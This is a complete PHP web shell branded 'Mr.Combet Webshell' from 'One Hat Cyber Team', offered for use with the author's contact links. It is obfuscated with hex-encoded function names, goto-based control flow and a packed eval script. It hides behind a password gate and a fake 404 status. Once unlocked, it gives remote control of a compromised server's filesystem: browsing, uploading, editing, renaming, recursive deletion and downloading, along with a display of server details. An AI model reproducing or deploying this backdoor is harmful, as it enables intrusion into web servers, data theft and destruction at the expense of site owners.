<?php
$password = '55dace80f1d0b755064e344fc4389c59';
error_reporting(0);
set_time_limit(0);

session_start();
if (!isset($_SESSION['loggedIn'])) {
    $_SESSION['loggedIn'] = false;
}

if (isset($_POST['password'])) {
    if (md5($_POST['password']) == $password) {
        $_SESSION['loggedIn'] = true;
    }
} 

if (!$_SESSION['loggedIn']): ?>

<html><head><title> </title></head>
  <body>
    <p align="center"><center><font style="font-size:13px" color="#008000" face="Trebuchet MS">
    <form method="post">
      <input type="password" name="password">
      <input type="submit" name="submit" value="  >>">
    </form>
  </body>
</html>

<?php
exit();
endif;
?>
<?php error_reporting(0);
http_response_code(404);
define("Yp", "");
$G3 = "scandir";
$c8 = [
    "7068705f756e616d65",
    "70687076657273696f6e",
    "676574637764",
    "6368646972",
    "707265675f73706c6974",
    "61727261795f64696666",
    "69735f646972",
    "69735f66696c65",
    "69735f7772697461626c65",
    "69735f7265616461626c65",
    "66696c6573697a65",
    "636f7079",
    "66696c655f657869737473",
    "66696c655f7075745f636f6e74656e7473",
    "66696c655f6765745f636f6e74656e7473",
    "6d6b646972",
    "72656e616d65",
    "737472746f74696d65",
    "68746d6c7370656369616c6368617273",
    "64617465",
    "66696c656d74696d65",
];
$lE = 0;
T4:
if (!($lE < count($c8))) {
    goto Je;
}
$c8[$lE] = JD($c8[$lE]);
Cy:
$lE++;
goto T4;
Je:
if (isset($_GET["p"])) {
    goto sr;
}
$Jd = $c8[2]();
goto VN;
sr:
$Jd = jD($_GET["p"]);
$c8[3](Jd($_GET["p"]));
VN:
function Ss($SP)
{
    $dE = "";
    $lE = 0;
    NZ:
    if (!($lE < strlen($SP))) {
        goto Xc;
    }
    $dE .= dechex(ord($SP[$lE]));
    WK:
    $lE++;
    goto NZ;
    Xc:
    return $dE;
}
function Jd($SP)
{
    $dE = "";
    $gf = strlen($SP) - 1;
    $lE = 0;
    Xp:
    if (!($lE < $gf)) {
        goto ur;
    }
    $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1]));
    Wn:
    $lE += 2;
    goto Xp;
    ur:
    return $dE;
}
function rn($F1)
{
    $Jd = fileperms($F1);
    if (($Jd & 0xc000) == 0xc000) {
        goto FZ;
    }
    if (($Jd & 0xa000) == 0xa000) {
        goto Eu;
    }
    if (($Jd & 0x8000) == 0x8000) {
        goto ES;
    }
    if (($Jd & 0x6000) == 0x6000) {
        goto sA;
    }
    if (($Jd & 0x4000) == 0x4000) {
        goto lG;
    }
    if (($Jd & 0x2000) == 0x2000) {
        goto tV;
    }
    if (($Jd & 0x1000) == 0x1000) {
        goto Tx;
    }
    $lE = "u";
    goto cC;
    FZ:
    $lE = "s";
    goto cC;
    Eu:
    $lE = "l";
    goto cC;
    ES:
    $lE = "-";
    goto cC;
    sA:
    $lE = "b";
    goto cC;
    lG:
    $lE = "d";
    goto cC;
    tV:
    $lE = "c";
    goto cC;
    Tx:
    $lE = "p";
    cC:
    $lE .= $Jd & 0x100 ? "r" : "-";
    $lE .= $Jd & 0x80 ? "w" : "-";
    $lE .= $Jd & 0x40 ? ($Jd & 0x800 ? "s" : "x") : ($Jd & 0x800 ? "S" : "-");
    $lE .= $Jd & 0x20 ? "r" : "-";
    $lE .= $Jd & 0x10 ? "w" : "-";
    $lE .= $Jd & 0x8 ? ($Jd & 0x400 ? "s" : "x") : ($Jd & 0x400 ? "S" : "-");
    $lE .= $Jd & 0x4 ? "r" : "-";
    $lE .= $Jd & 0x2 ? "w" : "-";
    $lE .= $Jd & 0x1 ? ($Jd & 0x200 ? "t" : "x") : ($Jd & 0x200 ? "T" : "-");
    return $lE;
}
function Xe($OB, $Ch = 1, $BL = "")
{
    global $Jd;
    $xe = $Ch == 1 ? "success" : "error";
    echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" .
        Ss($Jd) .
        $BL .
        "\"}})</script>";
}
function tF($yf)
{
    global $c8;
    if (!(trim(pathinfo($yf, PATHINFO_BASENAME), ".") === "")) {
        goto IE;
    }
    return;
    IE:
    if ($c8[6]($yf)) {
        goto PF;
    }
    unlink($yf);
    goto jK;
    PF:
    array_map(
        "deldir",
        glob($yf . DIRECTORY_SEPARATOR . "{,.}*", GLOB_BRACE | GLOB_NOSORT)
    );
    rmdir($yf);
    jK:
}
?> 
<!DOCTYPE html>
<html lang="en">
<head>
<meta property="og:image" content="https://dl.dropboxusercontent.com/s/gjdpc0so99lr8gt/combet.png" />
<meta property="og:title" content="Mr.Combet Webshell &#128293;" />
<meta property="og:description" content="One Hat Cyber Team" />
<meta name="theme-color" content="#ff1493">
<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="https://dl.dropboxusercontent.com/s/gjdpc0so99lr8gt/combet.png">
<title>Mr.Combet Webshell &#128293;</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
body {
    color: black;
    font-size: 0px;
    font-family: 'Kelly Slab';
    width: 99%;
    padding: 0px;
    margin-right: auto;
    margin-left: auto;
    margin-top: 7px;
    margin-bottom: 7px;
    background-color: black!important; }
.bg-dark { background-color: black!important; }
.border {
border: 2px solid #ff1493!important;
border-radius: 0.5rem!important;
background-color: transparent!important;
color: white;
}
.table td { padding: 0.1rem;box-shadow: inset 0px 0px 0px 1px deeppink;border-radius: 2px; }
.table thead th { 
    box-shadow: inset 0px 0px 0px 1.5px deeppink;
    color: #31ed06;
    padding: 0.25rem;
    border-radius: 5px;
}
.table-hover tbody tr:hover td{ background: #3f3f3f80;box-shadow: inset 0px 0px 0px 1px lime;border-radius: 2px; }
.table-hover tbody tr:hover td>*{ }
.table>tbody>tr>*{ color:#fff; vertical-align:middle; }
.form-control{background:0 0!important;color:#fff!important;border-radius:0;}
.form-control::placeholder{color:#fff;opacity:1}
.form-group {
    margin-top: 1.5px;
    margin-bottom: 1.5px;
}
li{
font-size:17px!important;
color: #31ed06!important;
list-style: inherit!important;
}
a {
color: #ffffff!important;
text-decoration: none!important;
}
a:hover {
text-decoration: none!important;
color: #31ed06!important;
}
h5 {
    margin-top: 1.5px;
    margin-bottom: 1.5px;
    font-size: 18px!important;
    color: lime!important;
    padding: 2px;
}
textarea {
    width: 97%;
    font-size: 16px;
    font-family: inherit;
    height: 44vh;
    padding-left: 5px;
}
button, input {
border: 2px solid #31ed06;
border-radius: 5px;
font-size: 16px;
color:white;
line-height: normal;
font-family: inherit;
}
button, input:hover { border: 2px solid #ff1493;cursor: pointer; }
.ohct {
    padding-left: 1rem;
    padding-right: 1rem;
    color: white;
    border: 2px solid #31ed06;
    border-radius: 5px;
    background-color: transparent;
    font-family: inherit;
    font-size: 16px;
}
.ohct:hover {
border: 2px solid #ff1493;
color: lime!important;
}
.combet { color: white; }
.combet:hover { color: #31ed06; }
.p-1 { padding: 4px; }
</style>
<style>
.fa {padding: 10px;color: lime;font-size: 20px;width: 50px;text-align: center;text-decoration: none;margin: 5px;border-radius: 5px;border: 2px solid lime;background: transparent;}
.fa:hover {border: 2px solid #ff1493;}
.text-light {color: #f8f9fa!important;font-size: 17px!important;}
</style>
<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body>
<div class="table-responsive text-light" style="border: 2px solid #ff1493;text-align: left;padding: 4px;border-radius: 0.5rem;">
<div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
<a href="mailto:combetohct@yahoo.com" class="fa fa-envelope"></a>
<a href="https://www.facebook.com/combet.ohct" class="fa fa-facebook"></a>
<a href="?" style="font-size: 2rem;text-shadow: 0px 0px 10px #ff1493;"><span>Mr.Combet WebShell</span></a>
<a href="https://wa.me/6281270303335" class="fa fa-whatsapp"></a>
<a href="https://t.me/combetohct" class="fa fa-telegram"></a> 
</div>
<li>Your IP : <span style="color: white;"><?php echo gethostbyname(
    $_SERVER["REMOTE_ADDR"]
); ?></span></li>
<li>Server IP : <span style="color: white;"><?php echo gethostbyname(
    $_SERVER["SERVER_NAME"]
); ?></span></li>
<li>Server : <span style="color: white;"><?php echo php_uname(); ?></span></li>
<li>Server Software : <span style="color: white;"><?php echo $_SERVER[
    "SERVER_SOFTWARE"
]; ?></span></li>
<li>PHP Version : <span style="color: white;"><?php echo phpversion(); ?></span></li>
<li>Add File : <a href="?p=<?= ss($Jd) .
    "&a=" .
    Ss("newFile") ?>" class="ohct">Submit</a></li>
<li>Add Directory : <a href="?p=<?= Ss($Jd) .
    "&a=" .
    sS("newDir") ?>" class="ohct">Submit</a></li>
<li><form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
<input type="file" name="f[]" multiple>
<input type="submit" style="padding-left: 1rem;padding-right: 1rem;padding-top: 3px;padding-bottom: 3px;border-radius: 5px;background-color: transparent;font-family: inherit;font-size: 16px;" value="Submit" name="submit">
<?php
if (!isset($_FILES["f"])) {
    goto ea;
}
$Wx = $_FILES["f"]["name"];
$lE = 0;
th:
if (!($lE < count($Wx))) {
    goto dx;
}
if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) {
    goto PG;
}
Xe("file failed to upload", 0);
goto tG;
PG:
XE("file uploaded successfully");
tG:
g9:
$lE++;
goto th;
dx:
ea:
if (!isset($_GET["download"])) {
    goto FA;
}
header("Content-Type: application/octet-stream");
header("Content-Transfer-Encoding: Binary");
header("Content-Length: " . $c8[17](JD($_GET["n"])));
header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\"");
FA:
?> 
</form></li>
</div>
<div class="table-responsive text-light" style="border: 2px solid #ff1493;text-align: left;padding: 4px;border-radius: 0.5rem;margin-bottom: 3px;margin-top: 3px;">
<li>Dir : <span><?php
$Op = $c8[4]("/(\\\\|\\/)/", $Jd);
foreach ($Op as $j3 => $Oe) {
    if (!($j3 == 0 && $Oe == "")) {
        goto xi;
    }
    echo "<a href=\"?p=2f\" class=\"combet\">~</a>/";
    goto CS;
    xi:
    if (!($Oe == "")) {
        goto sq;
    }
    goto CS;
    sq:
    echo "<a class=\"combet\" href=\"?p=";
    $lE = 0;
    de:
    if (!($lE <= $j3)) {
        goto ie;
    }
    echo sS($Op[$lE]);
    if (!($lE != $j3)) {
        goto s0;
    }
    echo "2f";
    s0:
    dg:
    $lE++;
    goto de;
    ie:
    echo "\">{$Oe}</a>/";
    CS:
}
Go:
?> 
</span></li></div>
<div class="table-responsive text-light" style="text-align: center;font-family: inherit;font-size: 17px;">
<?php
if (!isset($_GET["a"])) {
    goto Un;
}
if (!isset($_GET["a"])) {
    goto cc;
}
$im = Jd($_GET["a"]);
cc:
?>
<div class="table-responsive text-light">
<?php
if (!($im == "delete")) {
    goto Lu;
}
$BL = $Jd . "/" . Jd($_GET["n"]);
if (!($_GET["t"] == "d")) {
    goto VZ;
}
TF($BL);
if (!$c8[12]($BL)) {
    goto e8;
}
Xe("failed to delete the folder", 0);
goto iL;
e8:
Xe("folder deleted successfully");
iL:
VZ:
if (!($_GET["t"] == "f")) {
    goto xB;
}
$BL = $Jd . "/" . jd($_GET["n"]);
unlink($BL);
if (!$c8[12]($BL)) {
    goto uH;
}
Xe("file to delete the folder", 0);
goto Mk;
uH:
xe("file deleted successfully");
Mk:
xB:
Lu:
?>
<?php
if ($im == "newDir") {
    goto Fg;
}
if ($im == "newFile") {
    goto Pb;
}
if ($im == "rename") {
    goto Lw;
}
if ($im == "edit") {
    goto Ox;
}
if ($im == "view") {
    goto Ag;
}
goto WC;
Fg:
?>
<h5 class="border p-1">New Folder Name :</h5>
<form method="post">
<div class="form-group">
<input name="n" id="n" class="border p-1" autocomplete="off" style="text-align: center;">
</div>
<div class="form-group" style="margin-top: 10px;">
<button type="submit" name="s" class="ohct">Create</button>
</div> 
</form> 
<?php
isset($_POST["s"])
    ? ($c8[12]("{$Jd}/{$_POST["n"]}")
        ? xE("folder name has been used", 0, "&a=" . SS("newDir"))
        : ($c8[15]("{$Jd}/{$_POST["n"]}")
            ? Xe("folder created successfully")
            : Xe("folder failed to create", 0)))
    : null;
goto WC;
Pb:
?>
<h5 class="border p-1">New File Name :</h5>
<form method="post">
<div class="form-group">
<input type="text" name="n" id="n" class="border p-1" placeholder="" style="text-align: center;">
</div>
<div class="form-group">
<textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control border" placeholder=""></textarea>
</div>
<div class="form-group" style="margin-top: 10px;">
<button type="submit" name="s" class="ohct">Create</button> 
</div>
</form>
<?php
isset($_POST["s"])
    ? ($c8[12]("{$Jd}/{$_POST["n"]}")
        ? xE("file name has been used", 0, "&a=" . SS("newFile"))
        : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"])
            ? XE("", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"]))
            : Xe("file failed to create", 0)))
    : null;
goto WC;
Lw:
?>
<h5 class="border p-1">Rename File : <?= jD($_GET["n"]) ?></h5>
<form method="post">
<div class="form-group">
<input type="text" name="n" id="n" style="text-align: center;" class="border p-1" value="<?= jD(
    $_GET["n"]
) ?>">
</div>
<div class="form-group" style="margin-top: 10px;">
<button type="submit" name="s" class="ohct">Save</button>
</div>
</form>
<?php
isset($_POST["s"])
    ? ($c8[16]($Jd . "/" . jD($_GET["n"]), $_POST["n"])
        ? XE("successfully changed the folder name")
        : Xe("failed to change the folder name", 0))
    : null;
goto WC;
Ox:
?>
<h5 class="border p-1">Edit File Name : <font color="white"><?= Jd(
    $_GET["n"]
) ?></font></h5>
<form method="post">
<div class="form-group">
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control border"><?= $c8[18](
    $c8[14]($Jd . "/" . jD($_GET["n"]))
) ?></textarea>
</div>
<div class="form-group" style="margin-top: 10px;">
<button type="submit" name="s" class="ohct">Save</button>
</div>
</form>
<?php
isset($_POST["s"])
    ? ($c8[13]($Jd . "/" . jD($_GET["n"]), $_POST["ctn"])
        ? xE(
            "file contents changed successfully",
            1,
            "&a=" . sS("view") . "&n={$_GET["n"]}"
        )
        : xE("file contents failed to change"))
    : null;
goto WC;
Ag:
?>
<h5 class="border p-1">View File Name : <font color="white"><?= jd(
    $_GET["n"]
) ?></font></h5>
<div class="form-group">
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control border" readonly><?= $c8[18](
    $c8[14]($Jd . "/" . jd($_GET["n"]))
) ?></textarea>
</div>
<?php WC: ?>
</div>
<?php
goto mR;
Un:
?>
<table class="table table-hover table-borderless table-sm" style="text-align: center;width: 100%;">
<thead class="text-light">
<tr>
<th style="width: 45%;">Name</th>
<th style="width: 13%;">Size</th>
<th style="width: 13%;">Permission</th>
<th colspan="3">Action</th>
</tr>
</thead>
<tbody class="text-light"> <?php
$G3 = $c8[5]($G3($Jd), [".", ".."]);
foreach ($G3 as $yf) {
    if ($c8[6]("{$Jd}/{$yf}")) {
        goto CB;
    }
    goto Qj;
    CB:
    echo " 
<tr>
<td style=\"text-align: left;\">
<i class=\"fa fa-fw fa-folder-o\" style=\"border: 0;padding: 0;width: 1.28571429em;\"></i><a href=\"?p=" .
        sS("{$Jd}/{$yf}") .
        "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " .
        $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) .
        "\">{$yf}</a></td>
<td style=\"color: black;\"><span>------</span></td>
<td><font color=\"" .
        ($c8[8]("{$Jd}/{$yf}")
            ? "#00ff00"
            : (!$c8[9]("{$Jd}/{$yf}")
                ? "red"
                : null)) .
        "\">" .
        RN("{$Jd}/{$yf}") .
        "</font></td>
<td style=\"color: black;\"><span>------</span></td>
<td>
<a href=\"?p=" .
        ss($Jd) .
        "&a=" .
        ss("rename") .
        "&n=" .
        ss($yf) .
        "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\">Rename</a>
</td>
<td>
<a href=\"?p=" .
        sS($Jd) .
        "&a=" .
        ss("delete") .
        "&n=" .
        ss($yf) .
        "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\">Delete</a>
</td>
</tr>";
    Qj:
}
ad:
foreach ($G3 as $F1) {
    if ($c8[7]("{$Jd}/{$F1}")) {
        goto wA;
    }
    goto X1;
    wA:
    $kL = $c8[10]("{$Jd}/{$F1}") / 1024;
    $kL = round($kL, 3);
    $kL = $kL > 1024 ? round($kL / 1024, 2) . "  MB" : $kL . "  KB";
    echo "
<tr>
<td style=\"text-align: left;\">
<i class=\"fa fa-fw fa-file-o\" style=\"border: 0;padding: 0;width: 1.28571429em;\"></i><a href=\"?p=" .
        SS($Jd) .
        "&a=" .
        sS("view") .
        "&n=" .
        SS($F1) .
        "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " .
        $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) .
        "\">{$F1}</a></td>
<td><span>{$kL}</span></td>
<td><font color=\"" .
        ($c8[8]("{$Jd}/{$F1}")
            ? "#00ff00"
            : (!$c8[9]("{$Jd}/{$F1}")
                ? "red"
                : null)) .
        "\">" .
        rN("{$Jd}/{$F1}") .
        "</font></td>
<td><a href=\"?p=" .
        Ss($Jd) .
        "&a=" .
        Ss("edit") .
        "&n=" .
        SS($F1) .
        "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\">Edit</a></td>
<td><a href=\"?p=" .
        ss($Jd) .
        "&a=" .
        SS("rename") .
        "&n=" .
        ss($F1) .
        "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\">Rename</a></td>
<td><a href=\"?p=" .
        ss($Jd) .
        "&a=" .
        sS("delete") .
        "&n=" .
        ss($F1) .
        "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\">Delete</a></td>
</tr>";
    X1:
}
a2:
?> 
</tbody>
</table>
<h5 style="color: #31ed06;">
<font>&copy; Copyright 2022</font>
<font style="color: #ff1493;">Mr.Combet</font>
<font>Powered by </font>
<font style="color: #ff1493;">One Hat Cyber Team</font>
</h5>
<?php mR: ?> 
</div>
<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>
